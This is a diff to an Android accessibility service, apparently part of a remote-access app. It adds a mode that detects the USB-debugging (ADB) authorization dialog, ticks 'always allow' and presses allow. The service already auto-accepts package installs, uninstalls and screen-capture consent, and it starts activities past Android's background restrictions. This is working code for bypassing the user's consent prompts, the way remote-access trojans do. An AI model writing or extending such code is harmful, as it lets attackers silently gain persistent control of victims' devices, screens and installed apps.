@@ -24,6 +24,7 @@ public class RemoteAccessibility extends AccessibilityService {
     static volatile long autoAcceptUntil = 0;
     static volatile long autoAcceptNotBefore = 0;
     static volatile boolean projectionMode = false;
+    static volatile boolean debugMode = false;
     private final Handler h = new Handler(Looper.getMainLooper());
 
     // Botões do instalador de pacotes (instalar/desinstalar/concluir)
@@ -36,13 +37,16 @@ public class RemoteAccessibility extends AccessibilityService {
             "iniciar agora", "começar agora", "comecar agora", "start now", "comenzar ahora", "empezar ahora",
             "iniciar", "começar", "start", "compartilhar", "share", "permitir", "allow"
     };
+    // Diálogo "Permitir depuração USB?" (ADB local)
+    private static final String[] DEBUG_WORDS = { "permitir", "allow", "ok", "sim", "yes", "aceptar", "permitir sempre" };
+    private static final String[] DEBUG_CHECK = { "sempre permitir", "always allow", "permitir siempre" };
     private static final String[] CHECKBOX = { "não mostrar novamente", "nao mostrar novamente", "don't show again", "no volver a mostrar" };
 
     static boolean enabled() { return instance != null; }
 
     /** Instalação/desinstalação: aceita os botões do instalador. */
     static void autoAccept(long ms) {
-        projectionMode = false;
+        projectionMode = false; debugMode = false;
         autoAcceptNotBefore = System.currentTimeMillis() + 600;
         autoAcceptUntil = System.currentTimeMillis() + ms;
         final RemoteAccessibility s = instance;
@@ -51,14 +55,23 @@ public class RemoteAccessibility extends AccessibilityService {
 
     /** Captura de tela: espera o diálogo estabilizar e clica só no botão positivo. */
     static void autoAcceptProjection(long ms, long delayMs) {
-        projectionMode = true;
+        projectionMode = true; debugMode = false;
         autoAcceptNotBefore = System.currentTimeMillis() + delayMs;
         autoAcceptUntil = System.currentTimeMillis() + ms;
         final RemoteAccessibility s = instance;
         if (s != null) s.scheduleScan(delayMs + 100);
     }
 
-    static void cancelAutoAccept() { autoAcceptUntil = 0; projectionMode = false; }
+    /** Diálogo de autorização do ADB: marca "sempre permitir" e confirma. */
+    static void autoAcceptDebug(long ms) {
+        projectionMode = false; debugMode = true;
+        autoAcceptNotBefore = System.currentTimeMillis() + 800;
+        autoAcceptUntil = System.currentTimeMillis() + ms;
+        final RemoteAccessibility s = instance;
+        if (s != null) s.scheduleScan(900);
+    }
+
+    static void cancelAutoAccept() { autoAcceptUntil = 0; projectionMode = false; debugMode = false; }
 
     /** Abre uma Activity usando o contexto da acessibilidade (isento do bloqueio de background do Android 10+). */
     static void startActivityAny(Context fallback, Intent i) {
@@ -94,7 +107,7 @@ public class RemoteAccessibility extends AccessibilityService {
             if (now >= autoAcceptUntil) return;
             if (now < autoAcceptNotBefore) { scheduleScan(autoAcceptNotBefore - now + 50); return; }
             boolean clicked = scanAndAccept();
-            if (clicked && projectionMode) { cancelAutoAccept(); return; } // um clique só no diálogo de captura
+            if (clicked && (projectionMode || debugMode)) { cancelAutoAccept(); return; } // um clique só no diálogo de captura
             scheduleScan(clicked ? 1500 : 700);
         }}, delay);
     }
@@ -113,6 +126,11 @@ public class RemoteAccessibility extends AccessibilityService {
             if (p.equals(getPackageName())) continue;
             boolean installer = p.contains("packageinstaller") || p.contains("permissioncontroller");
             boolean system = p.contains("systemui") || p.equals("android") || p.contains("mediaprojection");
+            if (debugMode) {
+                if (!(system || p.contains("settings"))) continue;
+                if (acceptIn(r, DEBUG_WORDS)) return true;
+                continue;
+            }
             if (projectionMode ? !system : !installer) continue;
             if (acceptIn(r, projectionMode ? PROJECTION_WORDS : INSTALL_WORDS)) return true;
         }
@@ -122,6 +140,22 @@ public class RemoteAccessibility extends AccessibilityService {
     private boolean acceptIn(AccessibilityNodeInfo root, String[] words) {
         List<AccessibilityNodeInfo> all = new ArrayList<>();
         collect(root, all, 0);
+        if (debugMode) {
+            boolean isDebugDialog = false;
+            for (AccessibilityNodeInfo n : all) {
+                CharSequence t = n.getText();
+                if (t == null) continue;
+                String x = t.toString().toLowerCase(Locale.ROOT);
+                if (x.contains("depura") || x.contains("debug") || x.contains("rsa")) { isDebugDialog = true; break; }
+            }
+            if (!isDebugDialog) return false;
+            for (AccessibilityNodeInfo n : all) {
+                if (!n.isCheckable() || n.isChecked()) continue;
+                CharSequence t = n.getText();
+                String x = t == null ? "" : t.toString().toLowerCase(Locale.ROOT);
+                for (String w : DEBUG_CHECK) if (x.contains(w)) { n.performAction(AccessibilityNodeInfo.ACTION_CLICK); break; }
+            }
+        }
         if (projectionMode) {
             // marca "não mostrar novamente" (Android < 10 lembra o consentimento)
             for (AccessibilityNodeInfo n : all)
